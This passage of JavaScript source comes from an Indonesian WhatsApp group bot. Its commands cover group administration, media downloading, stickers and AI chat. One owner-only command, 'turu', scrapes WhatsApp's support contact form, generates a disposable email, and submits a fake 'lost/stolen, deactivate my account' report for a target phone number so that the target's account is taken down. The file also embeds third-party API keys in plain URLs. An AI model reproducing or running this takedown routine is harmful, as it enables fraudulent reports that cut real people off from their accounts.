if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await dark.downloadAndSaveMediaMessage(quoted)
await dark.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.success)
}
break
case 'setname': {
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
if (!text) return reply( 'Text ?')
reply(mess.wait)
await dark.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'setdesk': {
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
if (!text) return reply( 'Text ?')
reply(mess.wait)
await dark.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'afk': {
if (!m.isGroup) return reply( mess.group)
let user = global.db.users[m.sender]
const reason = q ? q : 'Nothing'
user.afkTime = + new Date
user.afkReason = reason
reply(`*@${sender.split("@")[0]}* sedang afk *${reason}*`)
}
break
case 'jadibot': {
if (!itsMedark) return reply(mess.owner)
if (m.isGroup) return reply(mess.private)
reply(mess.wait)
jadibot(dark, m, from)
}
break
case 'turu': {
if (!itsMedark) return reply(mess.owner)
reply(mess.wait)
if (Input) {
let cekno = await dark.onWhatsApp(Input)
if (cekno.length == 0) return reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == ownerNumber + "@s.whatsapp.net") return reply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
reply(`Sedang Limit Tunggu Beberapa Saat.`)
} else reply(util.format(res.data))
} catch (err) {setReply(`${err}`)}
} else reply('Masukkan Nomor Target!')
}
break
case 'listjadibot':
reply(mess.wait)
try {
let user = [... new Set([...global.conns.filter(dark => dark.user).map(dark => dark.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await dark.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
dark.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'owner': {
const repf = await dark.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
dark.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
}
break
case 'sc': case 'scriptbot': case 'scbot':{
dark.sendMessage(m.chat,{text:`Gw Bilek : Kamu Nanya?
Scnya Gw Private Awokawok 🗿`,mentions: [creator], },{quoted:m})
}
break
case 'open-ai': case 'ai':{
if (global.keyopenai === 'ISI') return reply('Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys')
if (!q) return reply(`Chat dengan AI.\n\nContoh:\n${command} Apa itu anime `)
reply(mess.wait)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: text,
temperature: 0.3,
max_tokens: 3000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
reply(`${response.data.choices[0].text}\n\n`)
}
break
case 'SsWeb': case 'ssweb': case 'Ssweb': case 'ScreenshotWeb': case 'ss':{
if (!q) return reply(`Linknya Mana?`)
reply(mess.wait)
dark.sendMessage(m.chat, {image: {url: `https://api.darktzy.eu.org/api/tools/ssweb?link=${q}&apikey=80ab30fa`}}, {quoted: m})
}
break    
case 'autosticker':
if (!itsMedark) return reply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*Sudah Aktif!*')
autosticker = true
reply('*Berhasil Mengaktifkan Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Belum Aktif!*')
autosticker = false
reply('*Berhasil Mematikan Autosticker*')
} else {
let buttons = [
{ buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dark.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
}
break
case 'ban':{
if (!itsMedark) return reply(mess.owner)
if (!itsMedark) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6285807264974`)
orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
let ceknye = await dark.onWhatsApp(orgnye)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('User Sudah Dibanned')
dark.updateBlockStatus(orgnye, 'block')
reply(`Succes Ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('User Tidak Dibanned')
dark.updateBlockStatus(orgnye, 'unblock')
reply(`Succes Unban`)
} else {
reply("Error")
}
}
break
case 'listban': {
reply(mess.wait)
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `${prefix}ban del ${i.split("@")[0]}`, description: "ketuk untuk mengunblockir"})
}
teskd += `\n\nketuk button untuk mengunblockir`
const sections = [
{
title: "Total Blockir " + banUser.length,
rows: listBloxk
}
]
const listMessage = {
text: teskd,
footer: fake,
title: "     「 List Participants Blockir 」",
buttonText: "List Blockir",
mentions: await dark.parseMention(teskd),
sections
}
dark.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Tidak ada user yang diblockir")
}
}
break
case 'leave':{
if (m.isGroup && itsMedark && command == "leave") return dark.groupLeave(from)
if (m.isGroup) return reply("Only private chat")
var rooms = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return reply("Anda tidak berada didalam room")
reply("Bye...")
var other = rooms.other(sender)
delete anon.anonymous[rooms.id]
if (other != "") dark.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
break
case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMedark) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dark.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
}
break
case 'add': {
if (!itsMedark) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMedark) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Mo Add Siapa?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dark.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'kick': {
if (!itsMedark) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMedark) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Mo Kick Siapa?`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dark.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!q) return reply(`Teks?`)
dark.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!q) return reply(`Teks?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
dark.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'tiktokvideo': 
case 'ttmp4':
case 'mp4' : {
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
dark.sendMessage(from, { video: { url: data.nowm }, mimetype: 'video/mp4'}, { quoted: m })
})
}
case 'tiktokaudio': 
case 'ttmp3':
case 'mp3': {
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
dark.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mpeg' }, { quoted: m })
})
}
break
case 'tt': {
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
let bton = [{
urlButton: {
displayText: 'SOURCE',
viewOnce: true,
url: q
}
}, {
quickReplyButton: {
displayText: 'NO WATERMARK',
viewOnce: true,
id: `${prefix}mp4 ${q}`
}
}, {
quickReplyButton: {
displayText: 'AUDIO',
viewOnce: true,
id: `${prefix}mp3 ${q}`
}
}]
dark.sendMessage(from, { caption: 'Kamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, pencet tombol dibawah untuk mengubahnya!', video: { url: data.watermark }, templateButtons: bton, viewOnce: true, footer: `This Is Simple WhatsApp Bot`, mentions: [sender] })
})
}
break
case 'ttp': {
if (!q) return reply(`${prefix + command} Kontolodon`)
reply(mess.wait)
dark.sendMessage(m.chat, {sticker: {url: "https://api.lolhuman.xyz/api/ttp?apikey=02ead3357242a6a0973c3363&text="+text}}, {quoted: m})
}
break
case 'attp':{
if (!q) return reply(`${prefix + command} Kontolodon`)
reply(mess.wait)
dark.sendMessage(m.chat, {sticker: {url: "https://api.lolhuman.xyz/api/attp?apikey=02ead3357242a6a0973c3363&text="+text}}, {quoted: m})
}
break
case 'googles': {
if (!q) return reply(`Example : ${prefix + command} DarkBotz WhatsApp`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'ytmp4': case 'mp4':{
if (!text) return reply('Masukan Link Nya!!!')
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytmp3': case 'mp3':{
if (!text) return reply('Masukan Link Nya!!!')
reply(mess.wait)
downloadMp3(text)
}
break
case 'setppbot': {
if (!itsMedark) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
var medis = await dark.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/md`) {
var { img } = await generateProfilePicture(medis)
await dark.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses`)
} else {
var memeg = await dark.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
break
case 'tourl': 
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
mee = await dark.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
dark.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'toaudio':
